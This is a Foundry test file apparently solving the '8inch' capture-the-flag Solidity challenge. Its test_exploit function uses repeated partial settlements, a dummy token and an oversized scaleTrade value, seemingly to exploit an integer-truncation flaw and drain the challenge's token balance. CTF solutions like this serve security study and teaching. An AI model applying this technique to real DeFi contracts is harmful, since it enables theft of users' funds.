// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "src/ERC20.sol";
import "src/SafeUint112.sol";
import "src/8inch.sol";
import "forge-std/console.sol";

contract ChallengeTest is Test {

    Challenge challenge;

    function setUp() public {
        challenge = new Challenge();
    }

    function test_exploit() public {

        // settle trade for 9 units

        TradeSettlement tradeSettlement = challenge.tradeSettlement();

        uint256 tradeId = 0;
        address maker;
        (maker,,,,,,,,) = tradeSettlement.getTrade(tradeId);

        assertEq(maker, address(challenge), "Incorrect trade id");

        tradeSettlement.settleTrade(tradeId, 8);
        tradeSettlement.settleTrade(tradeId, 8);
        tradeSettlement.settleTrade(tradeId, 8);
        tradeSettlement.settleTrade(tradeId, 8);


        SimpleERC20 dummy = new SimpleERC20("Novak", "NOVAK", 18, 1<<112);

        challenge.wojak().approve(address(tradeSettlement), 10000);
        dummy.approve(address(tradeSettlement), 1 << 112);

        tradeSettlement.createTrade(address(challenge.wojak()), address(dummy), 32, 1);

        tradeSettlement.scaleTrade(1, 2596148429267413814265248164610033);

        tradeSettlement.settleTrade(1, challenge.wojak().balanceOf(address(tradeSettlement)));

        challenge.wojak().transfer(address(0xc0ffee), 10 ether);

        assertEq(challenge.isSolved(), true);
    }

}